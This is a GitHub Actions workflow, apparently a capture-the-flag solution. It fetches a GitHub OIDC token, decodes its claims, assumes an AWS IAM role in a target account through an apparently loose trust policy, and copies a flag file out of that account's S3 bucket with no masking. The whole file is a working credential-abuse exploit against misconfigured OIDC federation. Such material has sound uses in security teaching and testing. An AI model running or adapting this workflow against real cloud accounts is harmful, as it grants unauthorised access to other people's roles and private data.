name: grab-flag
on:
  workflow_dispatch: {}

permissions:
  id-token: write
  contents: read

jobs:
  grab:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read

    steps:
      - name: Show context (sanity)
        run: |
          echo "owner/repo: $GITHUB_REPOSITORY"
          echo "ref:         $GITHUB_REF"
          echo "workflow_ref:$GITHUB_WORKFLOW_REF"

      # Debug claims เพื่อยืนยันว่า sub ตรง pattern
      - name: Debug OIDC claims
        run: |
          set -e
          RESP=$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
                 "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com")
          TOK=$(python3 - <<'PY' <<<"$RESP"
import sys,json; print(json.load(sys.stdin)["value"])
PY
)
          python3 - <<'PY' <<<"$TOK"
import sys,base64,json
p=sys.stdin.read().split('.')[1]; p+='='*(-len(p)%4)
print(json.dumps(json.loads(base64.b64decode(p)), indent=2))
PY

      - name: Configure AWS via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::694502195928:role/admin-godmode-flag-reader-lol-698875
          role-session-name: GH-GrabFlag
          aws-region: ap-southeast-1
          audience: sts.amazonaws.com
          role-skip-session-tagging: true

      - name: Prove identity
        run: aws sts get-caller-identity

      - name: Print RAW flag (no masking)
        run: aws s3 cp s3://oh-i-really-do-care/flag.txt -
